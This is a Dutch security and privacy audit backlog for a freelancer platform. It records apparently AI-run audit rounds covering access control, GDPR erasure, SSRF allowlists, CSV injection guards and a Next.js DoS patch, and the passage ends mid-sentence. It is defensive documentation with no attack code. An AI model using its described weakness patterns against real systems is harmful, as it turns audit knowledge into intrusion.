# SECURITY & PRIVACY BACKLOG — ZZP Platform

> Bevindingen uit de security-/privacy-auditronde. Gefixt = **OPGELOST** (met PR-referentie);
> geparkeerd met repro, severity (KRITIEK/HOOG/MIDDEL/LAAG), geschonden regel en aanbevolen fix.
> Pak per run de 1–3 belangrijkste; werk dit bestand bij.

## Ronde 2026-08-28 (basis: `main` @ 29729c14) — delta sinds #1258 + brede her-audit: geen nieuwe gaten

Audit: orchestrator (Opus 4.8) + 3 parallelle adversariële Opus-audits op niet-overlappende oppervlakken
(A: broken access control/IDOR/tenant-isolatie · B: privacy/AVG · C: injectie/upload/secrets/SSRF/headers/
errors/redirect). Focus lag op de **delta sinds de vorige audit** (`78a0b9ce..29729c14`, 6 commits — de
routing-provider **aflever-heartbeat** (`#1259`/`#1260`: dead-man's-switch op de uitgaande geoapify-fetch),
de **opdrachtgever-activiteit/anciënniteit trust-line** op opdracht-detail (`#1261`), het **kandidaat-
multi-apply**-breedtesignaal op `/kandidaten` (`#1262`) en de **geboekte-omzet-vooruitblik** op `/prognose`
(`#1263`), plus de bijbehorende nieuwe metrics-gauges), aangevuld met een brede re-sweep op de belendende
oppervlakken (~52 server actions, ~42 route handlers, storage/upload, anonymisering, market-rate/k-anon).

**Wat is geprobeerd / gedekt (OWASP Top 10 + AVG):**

- **[A01 Broken Access Control / IDOR + tenant-isolatie]** — `currentActor()` laadt rol/status/tenant
  **live uit de DB** (niet uit de JWT) en faalt gesloten op geschorst account, anonimisering, sessie-vóór-
  wachtwoordwijziging én geschorste tenant (`tenantAccessBlocked`). Tenant-scoping (`tenantScopeWhere`,
  `assertSameTenant`, `ownsViaTenant`, `visibleFreelancersWhere`, `canViewJob`) is één bron van waarheid,
  toegepast op zowel lijst-query als detail-check. De gevoelige document-/PDF-routes delen één geharde vorm:
  `requireActor`/`requireRole` → rate-limit → `findUnique` → ownership → **identieke 404 voor niet-gevonden
  én verboden** (anti-oracle, CWE-203) → `DOCUMENT_ACCESS_DENIED`-audit op beide takken. De nieuwe delta-
  oppervlakken zijn **read-only, geaggregeerd en correct gescoopt**: `getCompanyActivity` staat achter
  `showClientSignals` (alleen de reagerende ZZP'er, nooit de eigenaar) en geeft enkel tellingen +
  `memberSince` terug — geen individuele opdracht-/samenwerkingsdata, geen kandidaat-PII. `summarizeMultiApply`
  is puur afgeleid uit de reeds per-opdrachtgever-gescoopte `applications`-lijst (geen extra query, nooit een
  vreemde opdrachtgever, nooit tarieven/scores van de kandidaat op de andere opdracht). `/api/metrics` is
  `CRON_SECRET`-Bearer-gated (fail-closed: 503 zonder secret, 401 bij fout token) en op de `isPublicPath`-
  allowlist (exact-match).
- **[A03 Injectie / XSS / CSV-formule]** — Geen nieuwe `dangerouslySetInnerHTML` (de enige is de statische,
  nonce-gegatede theme-script in `layout.tsx`); geen `$queryRawUnsafe`/`$executeRawUnsafe`; alle `$queryRaw`
  zijn parameterloze `SELECT 1`-health-probes. `escapeCsvField` neutraliseert `= + @ - \t \r`-cellen (CWE-1236).
  De routing-URL-bouw zet de user-locatie enkel in `URLSearchParams` (geëncodeerde query-waarde — kan host/pad
  niet wijzigen). Nieuwe metrics-gauges zijn pure numerieke waarden zonder labels/PII.
- **[A04/A10 Upload + SSRF]** — Uploads: `validateUpload` (type-allowlist + ≤10 MB) → `assertContentMatchesMime`
  (magic-byte-sniff vs. gedeclareerde MIME) → `generateStorageKey` (`YYYY/randomUUID.<ext>` — user-bestandsnaam
  nooit in het pad); `LocalStorageDriver.resolve` heeft een path-traversal-guard. Elke server-side `fetch`
  richt zich op een **hardgecodeerde provider-host** (geoapify/mollie/stripe/resend/HIBP) of env-endpoint —
  geen user-gestuurde URL, geen weg naar 169.254.169.254/localhost/RFC1918.
- **[A02/A05/A07 Secrets, headers, auth]** — Nul `NEXT_PUBLIC_`-secrets, geen `.env` in git, geen PII/secret
  in logs (`logger.ts` redigeert + maskeert, met `pii-name-coverage`-gate). CSP met per-request-nonce +
  `strict-dynamic`, HSTS, `frame-ancestors 'none'`, `object-src 'none'`. Login/register/reset rate-limited;
  reset-token 256-bit `randomBytes`, SHA-256-at-rest, 1 u, single-use atomic; JWT 8 u + `passwordChangedAt`-
  invalidatie live. Geen open redirect (login hardcodeert `redirectTo: "/dashboard"`).
- **[AVG art. 17 — recht op vergetelheid]** — `anonymizeUser` is uitputtend: alle vrije-tekst-velden, de 2e/3e
  PII-kopieën (reject/credit/cancel/no-show/dispute-redenen ook in counterparty-`Notification.body`,
  `AuditLog.metadata`, `DomainEvent.payload`), gedragsmetadata, en documenten (rijen + blobs ná de transactie,
  TOCTOU-veilig). De `anonymize-schema-coverage.test.ts`-gate breekt CI zodra een nieuw PII-model niet gedekt is;
  de nieuwe delta introduceert geen ongedekt PII-model.
- **[AVG dataminimalisatie + k-anonimiteit + audit]** — `computeMarketRate`/`computeMarketBand` geven pas
  mediaan/p25/p75 vanaf `MARKET_RATE_MIN_SAMPLE = 10` peers (onder de drempel enkel een sample-telling).
  Documentinzage/verificatiebesluiten/exports zijn allemaal ge-audit. Company-activity en multi-apply voegen
  geen cross-partij-PII-oppervlak toe (enkel eigen-scope aggregaten).

**Resultaat:** alle drie de adversariële audits + de orchestrator-review: **CLEAN — geen bevestigde nieuwe
bevindingen.** Dit is een dekkings-/verificatie-PR (docs-only).

**Geparkeerd (deployment-config, geen code-defect — LAAG):** de retentie-crons (`*_RETENTION_DAYS`) staan
default UIT (opt-in, met een veilige floor voor `HEALTH_INCIDENT_IP_RETENTION_DAYS` = 90). Zonder ingevulde
env-vars blijft PII in `Notification`/`AuditLog` onbeperkt bewaard — potentieel spanning met AVG art. 5(1)(e)
(opslagbeperking) als de go-live-checklist deze niet zet. **Aanbevolen:** de go-live-runbook expliciet de
retentievensters laten zetten (mens-taak; genoteerd in MENSENWERK.md). Geen codewijziging nodig.

---

## Ronde 2026-08-27 (2e run — basis: `main` @ 78a0b9ce) — mail-intake-delta + brede her-audit: geen nieuwe gaten

Audit: orchestrator (Opus 4.8) + 2 parallelle adversariële Opus-audits op niet-overlappende oppervlakken.
Focus lag op de **delta sinds de vorige audit** (`2f85b8b5..78a0b9ce`, 9 commits — de nieuwe **mail-intake**
(`#1254`/`#1256`/`#1257`: publieke inbound-webhook + reviewqueue + per-bedrijf plus-adres-alias), de
kandidaat-funnel + bekijk-kandidaten-deeplink (`#1251`), betaalgedrag-opdrachtgever op het samenwerking-detail
(`#1253`), per-factuur belastingreservering-hint (`#1255`), upload-scan aflever-heartbeat (`#1250`) en de
platform-fee-refund bij annulering (`#1252`)), aangevuld met een brede re-sweep op de belendende oppervlakken.

**Wat is geprobeerd / gedekt (OWASP Top 10 + AVG):**

- **[A01 Broken Access Control / IDOR + tenant-isolatie]** — De hele mail-intake-mutatieketen
  (`opdrachten/mail-intake/actions.ts`: accept/dismiss/reopen + alias rotate/disable) draagt de volledige
  keten auth → `requireRole("CLIENT")` → ownership (`ownIntake` matcht `intake.companyId` tegen de eigen
  `Company.id` via `userId`) → Zod → expliciete overgangsmap (`assertMailIntakeTransition`) → TOCTOU-veilige
  `updateMany`-claim → audit. `acceptMailIntakeState` denormaliseert `tenantId: company.tenantId` op de nieuwe
  Job (spiegel van `saveJob`) → een franchise-aanvraag blijft binnen de tenant; geen cross-tenant-lek. Sample
  van 10 `[id]`/`[...key]`-route-handlers (documents/media/dossier/dba-dossier/modelovereenkomst/facturen-pdf/
  admin-facturatie-pdf/prestaties-pdf/franchise-exports) herbevestigd: elk fetcht-dan-vergelijkt server-side
  ownership/tenant/rol tegen de live `actor`, met identieke 404 voor niet-gevonden én verboden (anti-oracle,
  CWE-203) en `auditDeniedAccess` bij weigering. De bekijk-kandidaten-deeplink (`kandidaten/page.tsx?job=`)
  scoopt de `application.findMany` **onvoorwaardelijk** op `job: { company: { userId: actor.id } }`, dus een
  gegokt/vreemd `job`-id lekt nooit andermans kandidaten (defense-in-depth).
- **[A07/A02 Auth + crypto — publieke webhook]** — `/api/mail-intake/webhook` is secret-gated (404 zonder
  `MAIL_INTAKE_WEBHOOK_SECRET` — geen halve activering, CLAUDE.md regel 8), timing-safe geautoriseerd
  (`isAuthorizedMailIntakeHeader`: `Bearer`/`Basic`, `timingSafeEqual`, lengte-check), en correct op de
  `isPublicPath`-allowlist (exact-match, geen prefix-lek). Het alias-token is 80-bit `randomBytes` +
  `/^[a-z0-9]{8,32}$/`-vorm → niet-raadbaar; de company-resolutie (alias- én afzenderpad) eist in beide
  paden een **ACTIEF, niet-geanonimiseerd CLIENT**-account.
- **[A03 Injectie / XSS / CSV-formule]** — Geen nieuwe `dangerouslySetInnerHTML`; alle mail-afgeleide velden
  (`fromAddress`/`subject`/`textBody`/parsed) worden als JSX-tekst gerenderd (auto-escaped). De parser
  (`mail-intake.ts`) is puur/deterministisch, geen `$queryRaw`, geen template-injectie; `mailHtmlToText`
  decodeert `&amp;` als laatste (CWE-116 dubbel-ontsnappen vermeden). Kandidaat-funnel/betaalgedrag/
  belastingreservering zijn read-only Prisma-querybuilder-aggregaties, geen string-interpolatie.
- **[A04/DoS]** — Webhook buffert body achter een 10 MB-grens (Content-Length-voorcheck + na-check),
  rate-limit vóór auth/DB-I/O, en `200`-responsbeleid (parity betaal-webhook) tegen retry-storms; alleen
  ontbrekend secret (404) en mislukte auth (401) wijken af.
- **[AVG art. 17 — recht op vergetelheid]** — De nieuwe PII-dragende tabel `MailIntake` (`fromAddress` =
  derde-partij-e-mail, `subject`, `textBody` = vrije tekst) wordt in `anonymizeUser` **hard verwijderd**
  (`prisma.mailIntake.deleteMany({ where: { company: { userId } } })`), en `companyAnonymizationData` zet
  `mailIntakeAlias: null` (geen werkend inname-kanaal na erasure). De durable `anonymize-schema-coverage.test.ts`
  dekt `MailIntake` af (test groen). Geverifieerd rood-signaal-vrij: het model staat niet ongeclassificeerd.
  **Code-kant GEDAAN (2026-08-28) — óók AVG art. 5(1)(e) (opslagbeperking) nu afgedwongen:** art. 17 dekte
  alleen erasure-op-verzoek/accountverwijdering; de dóórlopende, tijdgebonden bewaartermijn ontbrak — voor
  een live opdrachtgever stapelden `MailIntake`-rijen zich onbeperkt op. Nu een geplande sweep
  **`mail-intake-retention`** (in `/api/tasks/run-all`, pure kern `src/lib/mail-intake-retention.ts` +
  `src/lib/mail-intake-retention-task.ts`) die alleen **besliste** intakes (ACCEPTED/DISMISSED) ouder dan
  het venster snoeit, geankerd op de onveranderlijke `receivedAt` (`prunableMailIntakeWhere` = single source
  of truth). SCOPE-VEILIG: een NEW/heropende intake wordt nooit geraakt. Anders dan de auditlog-retentie
  staat deze **standaard AAN op 180 dagen** (fail-safe naar wissen; `MAIL_INTAKE_RETENTION_DAYS` leeg = 180,
  min 30, `0` = expliciet uit) — inbound derde-partij-mail heeft na de beoordeling geen zelfstandige
  bewaargrond. PII-vrij `MAIL_INTAKE_PRUNED`-auditrecord (alleen telling + venster + cutoff).
- **[AVG dataminimalisatie + k-anonimiteit]** — Betaalgedrag-signaal hergebruikt de bestaande
  `PAYMENT_MIN_SAMPLE_SIZE = 3`-drempel (onder 3 betaalde facturen: `null`, tone `unknown`, geen getallen);
  `showsClientPaymentContext` voegt alleen een tweede weergave-oppervlak toe en verzwakt de drempel niet, en
  wordt uitsluitend voor de ZZP'er-partij (`isFreelancer`) berekend/getoond, nooit voor de opdrachtgever of
  meekijkende admin. Kandidaat-funnel toont enkel aggregaat-tellingen van de eigen opdracht (gate `isOwner`),
  geen kandidaat-PII. Nieuwe metrics-gauges (`zzp_upload_scan_*`) zijn pure numerieke waarden zonder labels/PII.

**Resultaat:** beide adversariële audits + de orchestrator-review: **CLEAN — geen bevestigde nieuwe bevindingen.**
`npm audit --omit=dev`: **0 vulnerabilities** (prod-runtime schoon). De 6 resterende advisories (brace-expansion/
deepmerge-ts/esbuild/js-yaml) zijn dev-transitief, niet bereikbaar in de prod-runtime — ongewijzigd geparkeerd
zoals de vorige rondes. Geen fix nodig deze ronde; dit is een dekkings-/verificatie-PR (docs-only).

## Ronde 2026-08-27 (basis: `main` @ 2f85b8b5) — brede her-audit schoon; durable RBAC-dekkingspoort op het admin-API-oppervlak toegevoegd

Audit: orchestrator (Opus 4.8) + 3 parallelle adversariële Opus-audits op niet-overlappende oppervlakken —
(1) álle server actions in de minder-betreden mappen (`admin/**`, `franchise/**`, `support`, `ideeen`,
`academie`, `diensten/importeer`, `abonnement`, `reacties`): de auth→rol→ownership→Zod→actie→audit-keten,
IDOR op gegokt id, mass-assignment, statusovergangen, existence-oracles; (2) cross-tenant isolatie
(`tenancy.ts` + álle `franchise/**` + `tenant-billing/**` + `platform-billing/**`) op client-beïnvloedbare
tenant-resolutie/cross-tenant-lek, plus PII-overfetch naar de client (select vs include) en k-anonimiteit
markttarief (≥10); (3) injectie (XSS/`dangerouslySetInnerHTML`, CSV/formule-injectie in álle exports, SQLi,
template-injectie), upload-veiligheid (type/grootte/magic-bytes/geen publiek pad/geen traversal), SSRF
(routing/geocode/HIBP/web-push-allowlist), open redirect, secrets/PII-in-logs, security headers/CSP/nonce,
error-leakage. **Alle drie audits: CLEAN — geen bevestigde nieuwe bevindingen.** De delta t.o.v. de vorige
basis (`94db801e..2f85b8b5`, 4 commits — waarde-overzicht samenwerking, Wet-DBA/rechtsvermoeden-signaal
ZZP'er op opdracht-detail, tarief/startdatum-prefill in samenwerkingsvoorstel) apart geverifieerd: de nieuwe
`collaboration-value`/`collaboration-proposal-prefill`/`job-dba-freelancer` zijn pure, deterministische
afgeleiden achter de bestaande `isParticipant`/`showClientSignals`-poorten over reeds ownership-gescoopte data
— geen nieuw authz-oppervlak. `npm audit --omit=dev`: **0 vulnerabilities** (prod-runtime schoon); Next.js
15.5.24 (augustus-2026 Critical-patch) en next-auth beta.32 blijven op de veilige vloer. De enige actie deze
ronde is een defense-in-depth-hardening (geen live gat) — zie hieronder.

### OPGELOST (defense-in-depth · durable poort) — [LAAG · OWASP A01 Broken Access Control · CLAUDE.md architectuurregel 2] admin-API-routes hadden geen CI-poort die server-side `requireRole("ADMIN")` afdwong

- **Geschonden regel:** CLAUDE.md architectuurregel 2 (auth → rol → ownership → … op elke toegang) als
  procesgat, niet als live defect. **Severity LAAG — geen exploiteerbaar gat vandaag:** elke bestaande
  `/api/admin/*`-route (`api/admin/export/invoices`, `api/admin/facturatie/[id]/pdf`) roept correct
  `requireRole("ADMIN")` aan.
- **Repro (procesgat, CONFIRMED):** de middleware-route-guard `isAdminPath` (`src/lib/route-guards.ts`) matcht
  alleen de PAGINA-paden `/admin` + `/admin/*`, NIET `/api/admin/*` (ander prefix). Dat is bewust — de
  middleware beschermt met een _redirect_ naar /dashboard, wat voor een API-route de verkeerde semantiek is
  (een consument hoort 403 JSON, geen 307 naar HTML). Gevolg: admin-API-routes hebben géén middleware-vangnet;
  hun enige rolpoort is de `requireRole`-aanroep in de handler zelf. Die dekking werd tot nu toe alleen door
  ontwikkelaars-discipline bewaakt — precies de faalmodus die eerder al PII stil liet overleven (`SavedJobSearch`
  in de erasure). Een toekomstige `/api/admin/*`-route die de aanroep vergeet, zou admin-only data (facturen-
  export, facturatie-PDF) aan elke ingelogde gebruiker serveren zonder dat iets het tegenhoudt.
- **Fix (deze PR):** durable dekkingspoort `src/app/api/admin/admin-route-authz-coverage.test.ts` — enumereert
  recursief álle `src/app/api/admin/**/route.ts` en dwingt af dat elk bestand een `requireRole(...)`-aanroep met
  "ADMIN" bevat (variadisch; `requireRole("ADMIN","FRANCHISER")` telt mee), plus een niet-vacuüm-guard
  (≥2 routes gevonden). Bewezen rood→groen: met `requireRole("ADMIN")` vervangen door `requireActor()` op
  `api/admin/export/invoices/route.ts` meldt de poort exact die route als ongedekt; hersteld → groen. Bevat ook
  een zelftest van de checker (comment-gestript, alle argumentvolgordes). Spiegelt `anonymize-schema-coverage.test.ts`.

## Ronde 2026-08-26 (2e run — basis: `main` @ 94db801e) — MIDDEL OPGELOST (onvolledige AVG art. 17-erasure: `SavedJobSearch`) + durable dekkingspoort + brede her-audit schoon

Audit: orchestrator (Opus 4.8) + 3 parallelle adversariële Opus-audits op niet-overlappende oppervlakken —
(1) de delta sinds de vorige basis (bewaarde-zoekopdrachten-alerts/-tellers, job-zichtbaarheid/tenant-scoping,
franchise pool-openstaand) op cross-tenant-lek, IDOR, existence-oracle; (2) **álle 59 HTTP route-handlers**
(`api/**/route.ts` + `(protected)/**/route.ts`): IDOR op elk `[id]`/`[...key]`-endpoint, path-traversal op
`media/[...key]`, cron/metrics/heartbeat fail-closed + timing-safe, SSRF (push-allowlist), open redirect,
error-leakage, rate-limiting op PII-exports, anti-oracle 404; (3) privacy/AVG: `account-anonymization`/
`anonymizeUser` (volledigheid art. 17 tegen álle 78 modellen), `account-export` (art. 15/20), PII-minimalisatie
naar de client, PII-in-logs, derde-partij-flows (Sentry/Geoapify/HIBP), k-anonimiteit markttarief (≥10), retentie.
Audits (1) en (2): **CLEAN — geen bevestigde nieuwe bevindingen**. Audit (3) vond de erasure exceptioneel volledig
(incl. drie-kopie-lekken naar ándermans notificatie-feed), maar signaleerde één **procesgat**: er was geen
CI-poort die afdwingt dat een nieuw PII-dragend model in de erasure wordt gedraad — en precies dat gat had zich al
gemanifesteerd. `npm audit --omit=dev`: **0 vulnerabilities** (prod-runtime schoon); dev-transitieve DoS-advisories
(brace-expansion/deepmerge-ts/esbuild/js-yaml) ongewijzigd, niet bereikbaar in de prod-runtime.

### OPGELOST — [MIDDEL · AVG art. 17 (recht op vergetelheid) + art. 15/20 · OWASP A01/privacy] `SavedJobSearch` overleefde de account-anonimisering

- **Geschonden regel:** AVG art. 17 — een verwijderverzoek moet álle persoonsgegevens van de betrokkene wissen.
  **Severity MIDDEL:** reëel onvolledige erasure van eigen gedrags-/voorkeurmetadata; latent (geen cross-partij-lek —
  de rij is privé voor de ZZP'er, net als `SavedJob`).
- **Repro (CONFIRMED):** `SavedJobSearch` (`name` = zelf-getypte vrije tekst, kan een persoon/plaats/opdrachtgever
  benoemen; `query` = opgeslagen zoekfilter; `createdAt`) is de exacte structurele spiegel van `SavedJob`
  (`freelancerProfileId` + `onDelete: Cascade`). `SavedJob` wordt in `anonymizeUser` expliciet hard verwijderd, maar
  `SavedJobSearch` — toegevoegd met de recente bewaarde-zoekopdrachten-feature (#1239–#1241) — was nooit ingedraad.
  Omdat de anonimisering het `FreelancerProfile` **update** (niet verwijdert), vuurt de `onDelete: Cascade` niet →
  de rijen bleven staan, toewijsbaar aan de behouden `FreelancerProfile.id`. De inzage-export (`account-export.ts`)
  toonde `SavedJob` wél maar `SavedJobSearch` niet → óók een art. 15/20-asymmetrie.
- **Fix (deze PR):** (a) `prisma.savedJobSearch.deleteMany({ where: { freelancer: { userId } } })` toegevoegd aan de
  erasure-transactie (spiegel van `savedJob`); (b) `savedJobSearches` toegevoegd aan `account-export.ts` (naam +
  query + createdAt, gescopet op het eigen profiel) voor art. 15/20-symmetrie. Rood→groen: assertie in
  `anonymize-erasure.test.ts` (deleteMany gescopet op `freelancer.userId`) en in `account-export.test.ts` (sectie +
  scope + select); beide falen zonder de bronwijziging.
- **Durable poort (voorkomt herhaling):** nieuwe `anonymize-schema-coverage.test.ts` — enumereert álle 78
  Prisma-modellen en dwingt af dat elk model óf door `anonymizeUser` wordt aangeraakt (`prisma.<model>`, woordgrens),
  óf op een expliciete, **gemotiveerde** uitzonderingslijst staat ([INFRA]/[REFERENCE]/[JOIN]/[FISCAAL]/[CASCADE]/
  [AUTH]/[APART]). Een toekomstig PII-model dat op geen van beide lijsten staat breekt de CI-poort i.p.v. stil PII te
  laten overleven. Bewezen rood→groen: zonder de `SavedJobSearch`-fix meldt de poort exact `SavedJobSearch` als
  ongeclassificeerd. Spiegelt `logger.pii-name-coverage.test.ts` (die hetzelfde doet voor log-redactie).

### GEPARKEERD — [LAAG · AVG art. 5(1)(e) opslagbeperking · MENSENWERK] productie-retentievensters staan default UIT

- **Geschonden regel:** AVG art. 5(1)(e) (opslagbeperking). **Severity LAAG** — by-design inert per CLAUDE.md regel 8
  (een integratie/retentievenster start pas na expliciete operator-configuratie), geen codedefect.
- **Repro:** `LEAD_RETENTION_DAYS`, `APPLICATION_RETENTION_DAYS` en de audit-log-retentie staan uitgecommentarieerd in
  `.env.example` → de opruimtaken zijn inert tot een mens ze op Railway zet. **MENSENWERK:** vóór go-live met echte
  VOG/diploma/BIG-gegevens moet een mens bevestigen dat deze vensters (én `PASSWORD_BREACH_CHECK=hibp`, `SENTRY_DSN`)
  daadwerkelijk aan staan. Niet iets dat een agent stil in productie-config mag omzetten.

### GEPARKEERD — [LAAG · OWASP A06 · dev-only] `Account`/`Session` (Auth.js-adaptertabellen) niet in de erasure gewist

- **Geschonden regel:** AVG art. 17 defense-in-depth. **Severity LAAG:** dit platform draait op credentials+JWT
  (stateless), dus `Account` (OAuth-tokens) en `Session` zijn in de praktijk **niet gevuld**; de erasure maakt het
  account sowieso inert (SUSPENDED, lege passwordHash, `currentActor` blokkeert). Bewust op de dekkingspoort-allowlist
  ([AUTH]) gezet i.p.v. gewist.
- **Aanbevolen fix (indien OAuth ooit wordt ingeschakeld):** voeg `prisma.account.deleteMany`/`session.deleteMany`
  (`where: { userId }`) aan de erasure toe zodat provider-tokens niet achterblijven. Nu een no-op, dus geparkeerd.

## Ronde 2026-08-26 (basis: `main` @ b46cfa06) — HOOG OPGELOST (Next.js Critical CVE-patch, App Router Server-Action DoS) + brede her-audit + delta schoon

Audit: orchestrator (Opus 4.8) + 3 parallelle adversariële Opus-audits op niet-overlappende oppervlakken —
(1) álle server actions (`"use server"`: samenwerkingen/facturen/documenten/reacties/profiel/account/certificaten/
uitgaven/support/prestaties/bewaarde-zoekopdrachten + de FRANCHISER multi-tenant-actions) op de auth→rol→ownership→
Zod→actie→audit-keten, IDOR, mass-assignment, statusovergangen, existence-oracles; (2) álle HTTP-handlers
(`api/**/route.ts` + `(protected)/**/route.ts`): IDOR op elk `[id]`-endpoint, path-traversal op `media/[...key]`,
cron/metrics/heartbeat fail-closed + timing-safe, SSRF (push-allowlist/vaste geocode-host), open redirect, error-leakage,
rate-limiting op PII-exports; (3) privacy/AVG: `account-anonymization.ts` (volledigheid art. 17), `account-export.ts`/
`avg/export` (art. 15), PII-minimalisatie naar de client, PII-in-logs, derde-partij-flows (Sentry/Geoapify/HIBP, art. 44),
k-anonimiteit markttarief (≥10), retentie. **Alle drie audits: CLEAN — geen bevestigde nieuwe bevindingen** op de
applicatie-oppervlakken. Delta t.o.v. de vorige basis (`e33dc875..b46cfa06`, 8 commits — bewaarde zoekopdrachten +
match-teller (ZZP'er), beslis-achterstand-chip (opdrachtgever), gelekt-wachtwoord-controle-heartbeat, tenant-fee-
grondslag, client-error URL-scrub) apart geverifieerd: de saved-search-actions dragen de volledige authz-keten +
no-oracle `deleteMany`, `buildJobMarketplaceWhere`/de match-teller injecteren `visibleJobsWhere(actor)` (tenant-gescoopt,
geen cross-tenant-telling), de HIBP-controle is k-anoniem (alleen 5-teken SHA-1-prefix verlaat de server, bcrypt-opslag,
fail-open, logt nooit wachtwoord/hash). `npm audit --omit=dev`: **0 vulnerabilities** (prod-runtime, vóór én ná de bump).

De enige nieuwe bevinding kwam uit de **stack-CVE-sweep** (OWASP A06 — Vulnerable & Outdated Components), niet uit de
codebase — zie hieronder.

### OPGELOST — [HOOG · OWASP A06 Vulnerable & Outdated Components · CLAUDE.md kwaliteitslat] Next.js 15.5.21 lag onder de augustus-2026 Critical-patch

- **Geschonden regel:** OWASP Top 10 A06 (Vulnerable and Outdated Components) — een productieframework draaien met een
  bekende, gepubliceerde Critical-kwetsbaarheid. **Severity HOOG** (upstream Critical): beschikbaarheid van een
  productie-SaaS met gevoelige documenten; geen datalek, wél een remote-triggerbare DoS.
- **Repro (CONFIRMED):** de app draaide op `next@15.5.21` (exact gepind in `package.json`). De **augustus-2026
  Next.js security-release** dichtte **twee Critical-kwetsbaarheden**, gepatcht in **15.5.24** (Maintenance LTS). De
  meest relevante — _Denial of Service in App Router using Server Actions_ — laat een speciaal vervaardigd HTTP-verzoek
  naar een willekeurig App-Router Server-Function-endpoint bij deserialisatie buitensporig CPU-gebruik veroorzaken (DoS).
  Dit platform draait **volledig op App Router + server actions**, dus dat endpoint-oppervlak is direct bereikbaar. (De
  tweede fix — middleware/proxy-bypass bij Turbopack + single-locale — is hier niet van toepassing: i18n is uitgezet.)
  Bron: Next.js augustus-2026 security-release-aankondiging + release-notes 15.5.24.
- **Fix (deze PR):** `next` gebumpt `15.5.21 → 15.5.24` (Maintenance-LTS-patchlijn; geen major-migratie), lockfile
  bijgewerkt, volledige gate opnieuw gedraaid (build inbegrepen — de bump breekt niets). Rood→groen: een supply-chain-
  regressiepoort `src/lib/security/next-version-floor.test.ts` bewaakt de veilige vloer 15.5.24 (installed-versie én de
  `package.json`-range); faalt onder de vloer (bewezen: 15.5.21 → RED), slaagt op/boven de vloer (15.5.24 → GREEN),
  laat toekomstige patch-bumps binnen 15.5.x toe. **`npm audit --omit=dev`: 0 vulnerabilities** ná de bump.
- **Zij-notitie (ongewijzigd, al veilig):** `next-auth@5.0.0-beta.32` is al ≥ de patch voor CVE-2026-73421 (improper
  authorization / fail-open middleware, gefixt in beta.32). Geen actie nodig.

Audit: orchestrator (Opus 4.8) + 3 parallelle adversariële Opus-audits op niet-overlappende oppervlakken —
(1) álle HTTP route-handlers (`src/app/api/**/route.ts` + de `(protected)/**/export/route.ts`): IDOR op elk
`[id]`-endpoint (documents/media/facturen-pdf/prestaties-pdf/dossier/dba-dossier/modelovereenkomst/admin-facturatie),
path-traversal op `media/[...key]`, cron-auth fail-closed op alle `tasks/*` + `metrics` + `heartbeat`, SSRF op push,
webhook-signing, anti-oracle 404-maskering, rate-limiting op PII-exports; (2) cross-tenant isolatie: `tenancy.ts` +
álle `franchise/**`-actions/pages/exports + `tenant-billing/**` — client-beïnvloedbare tenant-resolutie, cross-tenant
IDOR op gegokt id, aggregaties over tenants; (3) privacy/AVG: `account-anonymization.ts` (volledigheid van wissing:
user/profiel/documenten-in-storage/berichten/notificaties/audit-PII/credentials), `account-export.ts`, `avg/export`,
PII-overfetch naar de client, logs, `compliance/**`, `storage.ts`. Delta t.o.v. de vorige ronde (basis
`bb591865..e33dc875`, 6 commits — kandidatenvergelijking + CSV-export, dubbelboeking-detectie ZZP'er,
profiel-verbeterstappen, tenant-fee-grondslag): opnieuw geverifieerd — de kandidaat-vergelijk-loader
(`candidate-compare-data.ts`) is ownership-gepoort (`company: { userId: actorId }`), de CSV-export gaat via `toCsv`
(RFC 4180 + CWE-1236 formule-injectie-guard) + audit + rate-limit, `collaboration-overlap.ts` is puur/server-side,
`record-fee.ts` (tenant-fee) is tenant-gescoopt + idempotent + bevroren-na-facturatie. `npm audit --omit=dev`:
**0 vulnerabilities** (prod-runtime schoon); `npm audit` incl. dev: 6 dev-transitieve DoS-advisories (prisma-config/
esbuild-dev-server/js-yaml), niet bereikbaar in de prod-runtime, ongewijzigd t.o.v. vorige ronde.

**Dekking (OWASP Top 10 / ASVS + AVG):** A01 (object-/functie-authz + IDOR + multi-tenant — alle drie audits CONFIRMED
schoon), A02/A09 (secret-/PII-exfiltratie via logging/monitoring — de LAAG-fix hieronder sluit het laatste
client-error-lekpad), A03 (SQL/`$queryRaw`, XSS, CSV-formule-injectie), A04 (TOCTOU), A05 (headers/CSP/nonce),
A07 (auth/sessie/rate-limiting/cron-auth timing-safe), A10 (SSRF: push-allowlist, vaste routing/mail-hosts),
upload-/storage-veiligheid (magic-bytes + sandbox + path-traversal-guard), document-privacy (owner/admin + anti-oracle
404 + audit), AVG art. 5(1)(c/d/e/f), 15, 17 (volledige anonimisering geverifieerd), 25, 32, 44.

### OPGELOST — [LAAG · AVG art. 5(1)(f) · A09 defense-in-depth] client-error `message` werd niet URL-query-gestript

- **Geschonden regel:** AVG art. 5(1)(f) (integriteit/vertrouwelijkheid) + CLAUDE.md ("geen secrets in log"). **OWASP:**
  A09 (Security Logging & Monitoring Failures). Severity LAAG: smal, latent pad (dominante token-lekpaden — pagina-URL +
  stacktraces — waren al gedekt); dit was het laatste geparkeerde defense-in-depth-item uit ronde 2026-08-25.
- **Repro (PLAUSIBLE → nu dicht):** `parseClientError` (`src/lib/observability/client-error.ts`) haalde `stack` en
  `componentStack` wél door `stripUrlQueries`, maar `message` alleen door `truncate`. Bevat een browser-foutbericht
  toevallig een volledige URL met query-string of een token-in-pad (bv. een gefaalde fetch die de request-URL met een
  deel-/reset-token echoot), dan bereikte die de logger (alleen e-mail-gemaskeerd) én Sentry als exception-`value`
  (`toReportableError` → `new Error(message)`) — buiten de breadcrumb-scrub om — ongestript.
- **Fix (deze PR):** `message` gaat nu door dezelfde `stripUrlQueries` als stack/componentStack (query/fragment weg +
  geheime pad-segmenten geredigeerd), vóór de truncate. Rood→groen: twee nieuwe tests in `client-error.test.ts` —
  een URL-query-token in de message (`?token=SUPERSECRET123` → gestript, leesbare rest blijft) en een reset-token in
  een pad in de message (`/wachtwoord-herstellen/<token>` → `[redacted]`); beide faalden zonder de fix (het token bleef
  in de output). Volledige gate groen.

## Ronde 2026-08-25 (basis: `main` @ bb591865) — HOOG OPGELOST (Sentry-breadcrumbs lekten secrets/PII) + 2 geparkeerd (MIDDEL/LAAG)

Audit: orchestrator (Opus 4.8) + 3 parallelle adversariële Opus-audits op niet-overlappende oppervlakken —
(1) cross-tenant/IDOR op `src/lib/tenancy.ts` + alle `franchise/**`-actions/pages/exports, (2) object-/functie-authz-keten
op de per-gebruiker `actions.ts` (samenwerkingen/facturen/documenten/reacties/profiel/account/certificaten/uitgaven/
support/prestaties) + `src/components/actions/**`, (3) SSRF/injectie/PII-naar-derden/secrets/logs (routing/geocode,
